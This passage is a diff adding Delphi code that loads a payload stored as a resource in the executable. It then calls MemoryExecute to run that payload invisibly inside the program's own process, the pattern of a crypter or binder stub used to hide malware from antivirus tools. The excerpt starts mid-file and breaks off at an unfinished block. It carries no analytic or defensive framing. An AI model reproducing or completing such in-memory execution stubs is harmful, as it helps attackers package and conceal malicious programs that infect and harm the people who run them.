@@ -1,0 +1,23 @@
+function GetResData(var Size:integer; pSectionName: pchar): pointer;
+var
+  ResourceLocation: HRSRC;
+  ResourceHandle: THandle;
+begin
+  ResourceLocation := FindResource(hInstance, pSectionName, RT_RCDATA);
+  Size := SizeOfResource(hInstance, ResourceLocation);
+  ResourceHandle := LoadResource(hInstance, ResourceLocation);
+  Result := LockResource(ResourceHandle);
+  If Result <> NIL Then
+    FreeResource(ResourceHandle);
+end;
+
+
+           Use MemoryExecute as following:
+
+             MemoryExecute( pointer to buffer,
+                            string  to application to load into,
+                            string  to parameters if needed,
+                            boolean to start visible or invisible );
+           **********************************)
+           If (MemoryExecute(@BufferString[1], ParamStr(0), '', False)) Then
+           Begin
